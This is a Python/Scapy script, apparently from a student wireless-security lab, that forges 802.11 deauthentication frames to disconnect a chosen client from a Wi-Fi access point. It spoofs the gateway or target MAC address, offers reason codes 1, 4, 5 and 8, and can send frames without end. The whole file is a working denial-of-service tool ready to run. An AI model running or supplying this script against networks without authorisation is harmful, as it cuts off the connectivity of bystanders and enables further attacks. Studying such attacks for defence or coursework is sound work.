#! /usr/bin/env python
# Authors : Axel Vallon and Robin Gaudin
# Date : 26.03.2022

from scapy.all import *

def deauth(target_mac, gateway_mac, reason_code, inter=0.1, count=None, loop=1, iface="wlan0mon", verbose=1):

    if reason_code == '1' or reason_code == '4' or reason_code == '5':
        dot11 = Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac)
        packet = RadioTap()/dot11/Dot11Deauth(reason=int(reason_code))
        sendp(packet, inter=inter, count=count, loop=loop, iface=iface, verbose=verbose)
    elif reason_code == '8':
        dot11 = Dot11(addr1=gateway_mac, addr2=target_mac, addr3=gateway_mac)
        packet = RadioTap()/dot11/Dot11Deauth(reason=int(reason_code))
        sendp(packet, inter=inter, count=count, loop=loop, iface=iface, verbose=verbose)
    else:
        print('Unknown deauth subtype')
    # send the packet


if __name__ == '__main__':
    import argparse

    DEFAULT_TARGET = "ac:12:03:da:a2:87"
    DEFAULT_GATEWAY = "aa:db:03:6b:e1:38"
    DEFAULT_WLAN = "wlan0"
    parser = argparse.ArgumentParser(description="A python script for sending deauthentication frames")
    parser.add_argument("--target", help="Target MAC address to deauthenticate.", default=DEFAULT_TARGET)
    parser.add_argument("--gateway", help="Gateway MAC address that target is authenticated with", default=DEFAULT_GATEWAY)
    parser.add_argument("-c" , "--count", help="number of deauthentication frames to send, specify 0 to keep sending infinitely, default is 0", default=0)
    parser.add_argument("--interval", help="The sending frequency between two frames sent, default is 100ms", default=0.1)
    parser.add_argument("-i", dest="iface", help="Interface to use, must be in monitor mode, default is 'wlan'", default=DEFAULT_WLAN)
    parser.add_argument("-v", "--verbose", help="wether to print messages", action="store_true")

    reason_code = input("Enter the deauth code:\n"
        "1 - Unspecified\n" +
        "4 - Disassociated due to inactivity\n" +
        "5 - Disassociated because AP is unable to handle all currently associated stations\n"
        "8 - Deauthenticated because sending STA is leaving BSS\n")

    args = parser.parse_args()
    target = args.target
    gateway = args.gateway
    count = int(args.count)
    interval = float(args.interval)
    iface = args.iface
    verbose = args.verbose
    if count == 0:
        # if count is 0, it means we loop forever (until interrupt)
        loop = 1
        count = None
    else:
        loop = 0
    # printing some info messages"
    if verbose:
        if count:
            print(f"[+] Sending {count} frames every {interval}s...")
        else:
            print(f"[+] Sending frames every {interval}s for ever...")

    deauth(target, gateway, reason_code, interval, count, loop, iface, verbose)